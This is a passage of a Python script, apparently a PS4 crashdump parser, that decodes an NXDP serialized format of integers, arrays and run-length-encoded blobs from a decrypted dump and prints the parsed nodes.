            s.parsed.append(NxdpParser.parse(i))
    def read_byte(s):
        return struct.unpack('B', s.buf.read(1))[0]
    def decode(s):
        #print('decode @ %x' % (s.buf.tell()))
        # The idea is that everything eventually ends in leaf node which can be
        # represented as signed/unsigned integer, or a buffer.
        # Nodes consist of "uarray"s, which denote children, and
        # "array"s, which denote groups at the same level.
        b = s.read_byte()
        if b &lt;= 0x7f: # unsigned immediate
            return b
        elif b == 0xc0: # next byte is immediate type
            b = s.read_byte()
            if b == 2: # boolean "true"
                return True
            elif b == 3: # boolean "false"
                return False
            elif b == 4: # uarray begin
                # push level
                items = []
                while True:
                    i = s.decode()
                    if i is None:
                        break
                    items.append(i)
                return items
            elif b == 5: # uarray end
                # pop level
                return None
            else: assert False
        elif b == 0xc1: # blob_rle
            return s.decode_blob_rle()
        id = b &gt;&gt; 4
        arg = b &amp; 0xf
        if id == 0x9: # unsigned
            return s.decode_unsigned(arg)
        if id == 0xa: # array
            a = []
            for i in range(arg):
                a.append(s.decode())
            return a
        elif id == 0xb: # blob
            return s.decode_blob(arg)
        elif id == 0xd: # signed
            return s.decode_signed(arg)
        elif b &gt;= 0xe1: # signed immediate
            return sign_extend(b, 8)
        else: assert False
    def decode_unsigned(s, n):
        x = 0
        for i in range(n, 0, -1):
            x |= s.read_byte() &lt;&lt; ((i - 1) * 8)
        return x
    def decode_signed(s, n):
        u = s.decode_unsigned(n)
        # "sign-extend"...
        # This is normally used to encode kernel addresses,
        # so actually return unsugned...
        return (u | (0xffffffffffffffff &lt;&lt; (n * 8))) &amp; 0xffffffffffffffff
    def decode_blob(s, n):
        # n = 0 means length is encoded unsigned value
        if n == 0:
            n = s.decode()
        return s.buf.read(n)
    def decode_blob_rle(s):
        # decompressed size is stored first
        n = s.decode()
        # always starts with 0x97 which *doesn't* encode anything...
        assert s.read_byte() == 0x97
        # slow and simple
        blob = b''
        while len(blob) &lt; n:
            b = s.buf.read(1)
            if b ==  b'\x97':
                count = s.read_byte()
                if count &gt; 0:
                    b = s.buf.read(1) * count
            blob += b
        assert len(blob) == n
        return blob
    def dump(s):
        for i in s.parsed:
            print(i)
            
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'PS4 crashdump parser')
    parser.add_argument('dump_path')
    parser.add_argument('-i', '--openpsid', type = lambda x: binascii.unhexlify(x))
    parser.add_argument('-k', '--keyset_id', type = lambda x: list(map(int, x.split('.'))))
    args = parser.parse_args()

    nxdp = NXDP(BytesIO(Decryptor(args.dump_path, args.openpsid, args.keyset_id).data))
    nxdp.dump()
```


